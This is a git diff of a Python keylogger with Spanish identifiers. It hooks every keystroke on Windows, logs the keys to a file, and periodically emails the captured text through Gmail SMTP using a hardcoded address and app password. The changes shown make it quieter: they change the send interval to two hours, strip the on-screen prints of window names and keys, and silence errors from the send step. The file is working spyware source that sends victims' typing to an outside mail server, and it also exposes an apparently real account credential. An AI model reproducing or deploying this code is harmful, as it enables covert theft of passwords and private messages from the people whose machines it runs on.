@@ -1,7 +1,8 @@
+# coding: utf-8 
 import pyHook, pythoncom, logging, time, datetime
 
-carpeta_destino = "C:\\Users\\jean0\\OneDrive\\Escritorio\\key\\result_keylogger.txt"
-segundos_esperar = 5
+carpeta_destino = ".\\result_keylogger.txt"
+segundos_esperar = 7200
 timeout = time.time() + segundos_esperar
 
 def Timeout():
@@ -12,13 +13,16 @@ def Timeout():
 
 def EnviarEmail():
     with open (carpeta_destino, 'r+') as f:
-        with open ("C:\\Users\\jean0\\OneDrive\\Escritorio\\key\\data.txt", 'r+') as b:
+        with open (".\\data.txt", 'r+') as b:
             fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            data = f.read().replace("Space"," ").replace("\n","")
+            data = f.read().replace("Space"," ").replace("\n","").replace("Capital","(BloqMayus)").replace("Lshift","(Shift)").replace("Lcontrol","(control)").replace("Rcontrol","(control)").replace("Rshift","(Shift)").replace("Tab","(Tab)")
+            data = data.replace("Escape","(Esc)").replace("'Return","(Enter)").replace("Up","↑").replace("Left","←").replace("Down","↓").replace("Right","→").replace("Back","(deleted)").replace("Numlock","(Numlock)").replace("Add","(+)").replace("Subtract","(-)")
+            data = data.replace("Lwin","(WIN)").replace("Lmenu","(Alt)").replace("Rmenu","(AltGr)").replace("Oem_Comma","(,)").replace("Oem_Period","(.)").replace("'Oem_Minus","(-)").replace("Oem_5","|").replace("Oem_4","'")
+            data = data.replace("Oem_6","¿").replace("Divide","(/)").replace("Multiply","(*)").replace("Oem_7","({)").replace("Oem_2","(})").replace("Oem_Plus","(~)").replace("Oem_1","(´´)").replace("","").lower()
             g = b.read()
             data = "Mensaje capturado a las: " + fecha + "\n" + data
             print(data)
-            crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','josearmijos256@gmail.com',g ,data)
+            crearEmail('pabloenriquec256@gmail.com','ywpxtqegplmbkbxt','pabloenriquec256@gmail.com',g ,data)
             f.seek(0)
             f.truncate()
 def crearEmail(user,passw,recep,subj,body):
@@ -31,7 +35,6 @@ def crearEmail(user,passw,recep,subj,body):
     Txt = body
 
     email = """\From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
-
     try:
         server = smtplib.SMTP("smtp.gmail.com",587)
         server.ehlo()
@@ -39,16 +42,12 @@ def crearEmail(user,passw,recep,subj,body):
         server.login(mailUser,mailPass)
         server.sendmail(From, To, email)
         server.close()
-        print("Correo enviado con exito")
     except:
-        print("Correo fallido")
+        pass
 
 
 def OnKeyboardEvent(event):
     logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format='%(message)s')
-    print('WindowName:', event.WindowName)
-    print('Window:', event.Window)
-    print('Key:', event.Key)
     logging.log(10, event.Key)
     return True
 
